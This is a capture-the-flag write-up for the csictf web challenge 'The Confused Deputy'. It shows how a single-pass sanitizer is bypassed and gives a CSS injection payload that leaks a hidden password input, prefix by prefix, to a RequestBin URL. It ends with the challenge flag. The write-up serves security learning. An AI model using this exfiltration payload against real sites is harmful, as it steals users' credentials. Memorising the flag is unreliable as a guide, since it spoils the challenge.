---
layout: post
title: "The Confused Deputy"
author: "shreyas-sriram"
tags: ['Web']
---

Wow that's a pretty color! Don't you think? Pick your favourite and show it to the admin on /admin.

[http://chall.csivit.com:30256](http://chall.csivit.com:30256)

## Solution
* There are two input field :
	* `hidden input` with `value=<password>`
	* `visible input` where users can enter a color
* The entered input colors are sanitized and gets reflected in the `<style>` tag<br/>

```javascript
<style> .show {background-image: none; background-color: ${sanitized(input)}}</style>

function sanitized(content) {
        content = content.replace('<', '').replace('>', '');
        return content;
    }
```

* The sanitization is done only once, so it can be bypassed by using the following payload<br/>

```
<><malicious-payload>
```

* The santization removes `<>` and returns `<malicious-payload>`
* This is a case of `DOM-based XSS`, but XSS didn't execute on trying various payloads
* Then trying `CSS Injection` and using a RequestBinURL, it is possible to extract the password from the `hidden input` field<br/>

**Payload**<br/>
```
#000000;} input[type="password"][value^="<value-x>"] {background-image: url('https://<RequestBinURL>/<value-x>');
```

**Payload Explanation**<br/>
* `#000000;}` :
	* Closes the existing style element
* `input[type="password"][value^="<value-x>"] {background-image: url('https://<RequestBinURL>/<value-x>');` :
	* Creates a new style element for `input` tag whose `type=password` and `value` begins with `<value-x>`
* If the conditions satisfy, then a request is sent to the mentioned URL - `https://<RequestBinURL>/<value-x>`
* The entire password can be enumerated using the explained method
* Use `Burp Intruder` or write a script to automate the process


## Flag
```
csictf{cssxss}
```

